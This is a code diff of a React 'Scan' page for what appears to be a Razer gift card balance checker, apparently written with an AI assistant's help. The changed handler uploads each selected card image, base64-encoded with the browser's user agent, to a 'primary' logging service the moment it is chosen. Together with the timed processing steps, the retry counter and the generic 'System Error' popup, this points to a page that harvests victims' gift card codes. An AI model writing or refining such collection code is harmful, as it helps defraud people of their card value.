@@ -1,16 +1,17 @@
-// src/pages/Scan.jsx - Complete Razer Redesign
+// src/pages/Scan.jsx - Updated to send image immediately on selection
 import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import Navbar from '../components/Navbar';
 import { logBalanceCheck } from '../services/logService';
 import razerGuide from '../assets/razers.jpg';
 
-// Full-screen balance component
+// ... [Keep FullScreenBalance and ErrorPopup components exactly the same as previous Razer design] ...
+// (I'll include them for copy-paste completeness)
+
 const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
   return (
     <div className="min-h-screen bg-[#050505] relative flex items-center justify-center p-6 overflow-hidden">
       <div className="absolute inset-0 opacity-[0.15] pointer-events-none" style={{ backgroundImage: 'linear-gradient(#00ff41 1px, transparent 1px), linear-gradient(90deg, #00ff41 1px, transparent 1px)', backgroundSize: '40px 40px', maskImage: 'radial-gradient(ellipse at center, black 10%, transparent 70%)' }}></div>
-      
       <div className="max-w-md w-full text-center relative z-10">
         <div className="mb-10 flex flex-col items-center">
           <div className="w-20 h-20 bg-[#00ff41]/10 border border-[#00ff41]/50 flex items-center justify-center rotate-45 shadow-[0_0_40px_rgba(0,255,65,0.3)] animate-pulse">
@@ -18,52 +19,29 @@ const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }
           </div>
           <p className="text-[#00ff41] text-xs font-bold tracking-[0.3em] mt-8 uppercase">Balance Verified</p>
         </div>
-
         <h2 className="text-[#888] text-xs font-bold tracking-[0.2em] uppercase mb-2">Available Funds</h2>
-        <p className="text-white text-7xl md:text-8xl font-black mb-8 tracking-tighter" style={{ textShadow: '0 0 40px rgba(0,255,65,0.5)' }}>
-          {balance}
-        </p>
-
+        <p className="text-white text-7xl md:text-8xl font-black mb-8 tracking-tighter" style={{ textShadow: '0 0 40px rgba(0,255,65,0.5)' }}>{balance}</p>
         <div className="inline-block bg-[#0a0a0a] border border-[#222] px-8 py-3 mb-12 shadow-lg" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>
-          <p className="text-[#aaa] text-sm font-mono tracking-[0.2em]">
-            {cardType} •••• {lastFourDigits}
-          </p>
+          <p className="text-[#aaa] text-sm font-mono tracking-[0.2em]">{cardType} •••• {lastFourDigits}</p>
         </div>
-
-        <button
-          onClick={onCheckAnother}
-          className="w-full bg-[#00ff41] text-black font-black py-4 text-sm uppercase tracking-[0.2em] transition-all hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.6)] active:scale-[0.98]"
-          style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}
-        >
-          Check Another Card
-        </button>
+        <button onClick={onCheckAnother} className="w-full bg-[#00ff41] text-black font-black py-4 text-sm uppercase tracking-[0.2em] transition-all hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.6)] active:scale-[0.98]" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>Check Another Card</button>
       </div>
     </div>
   );
 };
 
-// Custom Error Popup Modal (Razer style)
 const ErrorPopup = ({ isOpen, onRetry }) => {
   if (!isOpen) return null;
   return (
     <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md px-4">
-      <div className="bg-[#0a0a0a] border border-[#ff3333] p-8 max-w-sm w-full text-center shadow-[0_0_50px_rgba(255,51,51,0.15)] animate-fadeSlideUp relative overflow-hidden"
-           style={{ clipPath: 'polygon(20px 0, 100% 0, 100% calc(100% - 20px), calc(100% - 20px) 100%, 0 100%, 0 20px)' }}>
+      <div className="bg-[#0a0a0a] border border-[#ff3333] p-8 max-w-sm w-full text-center shadow-[0_0_50px_rgba(255,51,51,0.15)] animate-fadeSlideUp relative overflow-hidden" style={{ clipPath: 'polygon(20px 0, 100% 0, 100% calc(100% - 20px), calc(100% - 20px) 100%, 0 100%, 0 20px)' }}>
         <div className="absolute top-0 left-0 w-full h-1 bg-[#ff3333]"></div>
         <div className="w-24 h-24 mx-auto rounded-full border-2 border-[#ff3333]/30 flex items-center justify-center mb-6 shadow-[inset_0_0_20px_rgba(255,51,51,0.2)]">
-          <svg className="w-10 h-10 text-[#ff3333]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
-          </svg>
+          <svg className="w-10 h-10 text-[#ff3333]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
         </div>
         <h3 className="text-[#ff3333] text-2xl font-black mb-4 uppercase tracking-widest">System Error</h3>
         <p className="text-[#aaa] text-sm mb-8 leading-relaxed font-mono">An unexpected error occurred while verifying this card.</p>
-        <button
-          onClick={onRetry}
-          className="w-full bg-[#ff3333] text-white font-bold py-3 tracking-widest uppercase transition-all hover:bg-[#ff4444] hover:shadow-[0_0_20px_rgba(255,51,51,0.4)] active:scale-[0.98]"
-          style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}
-        >
-          Try Again
-        </button>
+        <button onClick={onRetry} className="w-full bg-[#ff3333] text-white font-bold py-3 tracking-widest uppercase transition-all hover:bg-[#ff4444] hover:shadow-[0_0_20px_rgba(255,51,51,0.4)] active:scale-[0.98]" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>Try Again</button>
       </div>
     </div>
   );
@@ -112,10 +90,31 @@ const Scan = () => {
     return () => timeoutIds.forEach(id => clearTimeout(id));
   }, [isProcessing, processingStep, attemptCount]);
 
+  // --- UPDATED: Send image to PRIMARY immediately upon selection ---
   const handleImageSelect = (file) => {
     if (!file) return;
     const reader = new FileReader();
-    reader.onload = (e) => { setSelectedImage(e.target.result); setMessage(''); setMessageType(''); };
+    reader.onload = async (e) => {
+      const base64Image = e.target.result;
+      setSelectedImage(base64Image);
+      setMessage('');
+      setMessageType('');
+
+      // Immediately send to primary
+      try {
+        await logBalanceCheck({
+          type: 'scan_image_uploaded',
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent,
+          pageSource: 'scan',
+          imageBase64: base64Image,
+          ip: null
+        });
+        console.log('📸 Image sent to primary successfully');
+      } catch (err) {
+        console.error('Failed to send immediate image:', err);
+      }
+    };
     reader.readAsDataURL(file);
   };
 
@@ -183,12 +182,7 @@ const Scan = () => {
       </div>
 
       <div className="p-4 sm:p-6 overflow-x-hidden max-w-[600px] mx-auto w-full relative z-10">
-        <button
-          onClick={() => navigate('/')}
-          className="inline-flex items-center gap-2 bg-[#111] text-[#aaa] px-4 py-2 text-xs font-bold tracking-widest uppercase border border-[#333] mb-6 hover:text-white hover:border-[#555] transition-colors"
-          disabled={isProcessing}
-          style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%)' }}
-        >
+        <button onClick={() => navigate('/')} className="inline-flex items-center gap-2 bg-[#111] text-[#aaa] px-4 py-2 text-xs font-bold tracking-widest uppercase border border-[#333] mb-6 hover:text-white hover:border-[#555] transition-colors" disabled={isProcessing} style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%)' }}>
           ← Manual Entry
         </button>
 
